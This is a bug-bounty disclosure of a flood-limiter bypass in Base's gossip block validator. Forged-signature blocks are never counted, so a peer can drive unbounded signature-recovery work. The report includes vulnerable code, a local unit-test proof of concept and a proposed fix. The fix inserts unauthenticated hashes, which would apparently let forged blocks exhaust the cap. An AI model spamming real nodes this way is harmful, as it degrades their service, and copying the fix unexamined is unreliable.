# 74849 bc medium p2p gossip flood limiter bypass via invalid signature block spam

**Submitted on Apr 25th 2026 at 10:14:22 UTC by @M1S00 for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #74849
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.24>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

Hi Team,

I hope you are doing well,

The gossip block validator in `base-consensus-gossip` maintains a per-height `seen_hashes` map to cap the number of unique blocks accepted per block height (`MAX_BLOCKS_TO_KEEP = 5`). However, the hash insertion into `seen_hashes` only occurs **after** successful signature verification. This ordering means that blocks carrying an invalid or forged signature are never recorded in the map, so the `TooManyBlocks` flood limiter never triggers for them. Any connected gossip peer can spam an unbounded number of uniquely-hashed, invalid-signature messages at the same block height, forcing the node to perform a full ECDSA `ecrecover` for every single message with no rate limiting ever kicking in.

## Vulnerable File

**Path:** `crates/consensus/gossip/src/block_validity.rs`

```rust
// Lines 199-235
if let Some(seen_hashes_at_height) =
    self.seen_hashes.get_mut(&envelope.payload.block_number())
{
    // flood limiter - never triggers for invalid-signature blocks
    if seen_hashes_at_height.len() > Self::MAX_BLOCKS_TO_KEEP {
        return Err(BlockInvalidError::TooManyBlocks { .. });
    }
    if seen_hashes_at_height.contains(&envelope.payload.block_hash()) {
        return Err(BlockInvalidError::BlockSeen { .. });
    }
}

// signature check runs here - expensive ecrecover
let Ok(msg_signer) = envelope.signature.recover_address_from_prehash(&msg) else {
    return Err(BlockInvalidError::Signature);
};
if msg_signer != block_signer {
    return Err(BlockInvalidError::Signer { .. });
}

// insertion only happens on success; forged blocks never reach here
self.seen_hashes
    .entry(envelope.payload.block_number())
    .or_default()
    .insert(envelope.payload.block_hash());
```

## Why This Is a Vulnerability

The flood limiter and the state update that makes it work are separated by the signature check. Invalid-signature blocks fail before the insert, so `seen_hashes` stays empty for forged messages. The guard is checking a map that is never populated by the attack traffic it was designed to stop, making the protection entirely inert for unauthenticated blocks.

## Impact

Any peer connected to the node over the Base gossip network can continuously send messages with unique block hashes and garbage signatures at the same block height. The node will run a full ECDSA signature recovery on every message indefinitely, with no flood limiter ever activating. This causes unbounded CPU consumption on the targeted node, directly mapping to **"Increasing network processing node resource consumption by at least 30% without brute force actions"** - **Medium severity** per the program's severity classification.

## Proof of Concept

### Setup

Add the following test to the bottom of the existing `mod tests` block in `crates/consensus/gossip/src/block_validity.rs` (already added in this repo):

```rust
#[test]
fn test_invalid_signature_blocks_bypass_flood_limiter() {
    let (_, unsafe_signer) = tokio::sync::watch::channel(Address::default());
    let mut handler = BlockHandler::new(
        RollupConfig { l2_chain_id: Chain::base_mainnet(), ..Default::default() },
        unsafe_signer,
    );

    let target_height = 12345_u64;
    let spam_count = BlockHandler::MAX_BLOCKS_TO_KEEP * 10;
    let mut signature_errors = 0usize;
    let mut flood_errors = 0usize;

    for _ in 0..spam_count {
        let mut block = v1_valid_block();
        block.header.number = target_height;
        let v1 = ExecutionPayloadV1::from_block_slow(&block);
        let payload = BaseExecutionPayload::V1(v1);
        let envelope = NetworkPayloadEnvelope {
            payload,
            signature: Signature::test_signature(),
            payload_hash: PayloadHash(B256::ZERO),
            parent_beacon_block_root: None,
        };
        match handler.block_valid(&envelope) {
            Err(BlockInvalidError::Signer { .. }) => signature_errors += 1,
            Err(BlockInvalidError::TooManyBlocks { .. }) => flood_errors += 1,
            _ => {}
        }
    }

    assert_eq!(signature_errors, spam_count);
    assert_eq!(flood_errors, 0);
    assert!(handler.seen_hashes.is_empty());
}
```

### Run Command

From the workspace root:

```bash
RUSTFLAGS="-C linker=cc -C link-arg=-fuse-ld=bfd" \
cargo test -p base-consensus-gossip \
  test_invalid_signature_blocks_bypass_flood_limiter -- --nocapture
```

### Expected Output

```
┌──(m1s0㉿M1S0)-[~/Desktop/BugBounty/Web3/Smart Contract/DLT/base-0.8.0-rc.15]
└─$  RUSTFLAGS="-C linker=cc -C link-arg=-fuse-ld=bfd" cargo test -p base-consensus-gossip test_invalid_signature_blocks_bypass_flood_limiter -- --nocapture
    Finished `test` profile [unoptimized + debuginfo] target(s) in 0.66s
     Running unittests src/lib.rs (target/debug/deps/base_consensus_gossip-6d2f3e3123ae7fd8)

running 1 test
test block_validity::tests::test_invalid_signature_blocks_bypass_flood_limiter ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 44 filtered out; finished in 6.99s

┌──(m1s0㉿M1S0)-[~/Desktop/BugBounty/Web3/Smart Contract/DLT/base-0.8.0-rc.15]
```

All 50 blocks (10x `MAX_BLOCKS_TO_KEEP`) return `Signer` error, `TooManyBlocks` is raised zero times, and `seen_hashes` remains empty, proving the flood limiter is fully bypassed.

## Remediation

Move the `seen_hashes` insertion to occur **before** the signature check, so the flood limiter tracks all incoming messages regardless of signature validity:

```rust
// Insert BEFORE signature verification
self.seen_hashes
    .entry(envelope.payload.block_number())
    .or_default()
    .insert(envelope.payload.block_hash());

if self.seen_hashes.len() >= Self::SEEN_HASH_CACHE_SIZE {
    self.seen_hashes.pop_first();
}

// Now check signature
let Ok(msg_signer) = envelope.signature.recover_address_from_prehash(&msg) else {
    return Err(BlockInvalidError::Signature);
};
```

This ensures that every unique block hash, valid or forged, is counted against the per-height cap, making the `TooManyBlocks` guard effective for all attack traffic.
